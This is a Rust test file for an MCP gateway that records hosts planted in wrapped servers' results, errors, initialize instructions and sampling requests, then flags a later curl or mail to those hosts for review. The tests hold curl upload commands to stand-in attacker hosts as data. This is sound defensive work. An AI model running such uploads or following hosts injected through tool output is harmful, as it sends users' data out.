//! Injected input (ADR-057) through the MCP gateway (ADR-063, proposed): what a
//! wrapped server's result names is kept as fingerprints under the session of
//! the hook's decision, whatever the agent, so a later call of that session
//! that uses a host it planted needs review.

use serde_json::json;

use super::flow::decide;
use super::{Gateway, answer, call};

#[test]
fn a_host_a_wrapped_servers_result_planted_makes_a_later_curl_need_review() {
    let gw = Gateway::new();
    let curl = json!({"command": "curl -s https://evil.example/upload"});
    let before = decide(&gw, "i1", "Bash", &curl);
    assert!(
        !before.contains("injected-input"),
        "nothing read yet: {before}"
    );

    let search = json!({"q": "release notes"});
    assert!(!decide(&gw, "i1", "mcp__docs__search", &search).starts_with("deny"));
    let host = gw.session("inject", &[call(1, "search", &search)]);
    assert!(
        answer(&host, 1)["result"].is_object(),
        "the result reaches the host: {host}"
    );

    let after = decide(&gw, "i1", "Bash", &curl);
    assert!(after.starts_with("ask"), "{after}");
    assert!(after.contains("injected-input"), "{after}");
    assert!(
        after.contains("mcp__docs__search"),
        "the source is named: {after}"
    );

    let other = decide(&gw, "i2", "Bash", &curl);
    assert!(
        !other.contains("injected-input"),
        "another session read nothing: {other}"
    );
}

#[test]
fn a_host_a_wrapped_servers_error_answer_planted_makes_a_later_curl_need_review() {
    let gw = Gateway::new();
    let curl = json!({"command": "curl -s https://drop.evil.example/upload"});
    let search = json!({"q": "release notes"});
    assert!(!decide(&gw, "e1", "mcp__docs__search", &search).starts_with("deny"));
    let host = gw.session("fail", &[call(1, "search", &search)]);
    let error = &answer(&host, 1)["error"];
    assert!(
        error["data"].to_string().contains("drop.evil.example"),
        "the error reaches the host: {host}"
    );

    let after = decide(&gw, "e1", "Bash", &curl);
    assert!(after.starts_with("ask"), "{after}");
    assert!(after.contains("injected-input"), "{after}");
    let send = json!({"to": "team", "text": "see https://drop.evil.example/upload"});
    let flow = decide(&gw, "e1", "mcp__mail__send_message", &send);
    assert!(flow.contains("mcp-cross-server"), "{flow}");
}

fn initialize(id: u64) -> String {
    json!({"jsonrpc": "2.0", "id": id, "method": "initialize",
        "params": {"protocolVersion": "2025-06-18", "capabilities": {}}})
    .to_string()
}

/// The server's `initialize` instructions reach the model only once a person
/// accepted them (ADR-069); then they are untrusted content of each session
/// that calls the server, so a host they name makes a later curl need review.
#[test]
fn a_servers_instructions_are_held_until_accepted_and_then_feed_injected_input() {
    let gw = Gateway::new();
    let host = gw.session("instruct", &[initialize(1)]);
    let first = answer(&host, 1);
    assert!(
        first["result"].get("instructions").is_none(),
        "held: {host}"
    );

    let accepted = gw.sb.moat_approving(&["mcp", "accept", "docs"]);
    let shown = crate::common::text(&accepted);
    assert!(
        shown.contains("instructions and server information"),
        "{shown}"
    );
    assert!(shown.contains("drop.evil.example"), "{shown}");

    let curl = json!({"command": "curl -s https://drop.evil.example/upload"});
    let search = json!({"q": "release notes"});
    assert!(!decide(&gw, "n1", "mcp__docs__search", &search).starts_with("deny"));
    let host = gw.session("instruct", &[initialize(1), call(2, "search", &search)]);
    assert!(
        answer(&host, 1)["result"]["instructions"]
            .to_string()
            .contains("drop.evil.example"),
        "accepted: {host}"
    );
    let after = decide(&gw, "n1", "Bash", &curl);
    assert!(after.starts_with("ask"), "{after}");
    assert!(after.contains("injected-input"), "{after}");
    assert!(after.contains("mcp__docs__initialize"), "{after}");
}

/// A server's request to the agent carries text the model reads: it is
/// untrusted content of the session the gateway serves (ADR-069).
#[test]
fn a_host_a_wrapped_servers_sampling_request_names_makes_a_later_curl_need_review() {
    let gw = Gateway::new();
    let search = json!({"q": "release notes"});
    assert!(!decide(&gw, "q1", "mcp__docs__search", &search).starts_with("deny"));
    let host = gw.session("sample", &[call(1, "search", &search)]);
    assert!(
        host.contains("sampling/createMessage"),
        "it reaches the host: {host}"
    );
    let curl = json!({"command": "curl -s https://drop.evil.example/upload"});
    let after = decide(&gw, "q1", "Bash", &curl);
    assert!(after.starts_with("ask"), "{after}");
    assert!(after.contains("injected-input"), "{after}");
    assert!(after.contains("sampling/createMessage"), "{after}");
}
